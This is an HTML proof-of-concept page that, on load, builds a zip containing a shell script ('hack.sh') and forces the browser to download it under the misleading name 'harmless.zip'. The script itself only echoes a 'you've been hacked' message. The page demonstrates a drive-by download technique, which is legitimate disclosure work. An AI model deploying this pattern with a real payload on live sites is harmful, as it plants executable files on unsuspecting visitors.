<html>
  <head>
    <title>Auto-Download PoC</title>
    <script src="https://cdn.jsdelivr.net/npm/jszip@3.7.1/dist/jszip.min.js"></script>
  </head>
  <body>
    <h1>h3llo world.</h1>
    <p>Click <a id="manual-download" href="#">here</a> if it doesn't.</p>
    <script>
      var zip = new JSZip();
      zip.file("hack.sh", "#!/bin/bash\necho \"You've been hacked! This is a PoC to demonstrate the vulnerability.\"");
      zip.generateAsync({type:"blob"}).then(function(blob) {
        var url = URL.createObjectURL(blob);
        var a = document.createElement('a');
        a.href = url;
        a.download = 'harmless.zip';
        document.body.appendChild(a);
        a.click();
        document.body.removeChild(a);
        document.getElementById('manual-download').href = url;
      });
    </script>
  </body>
</html>
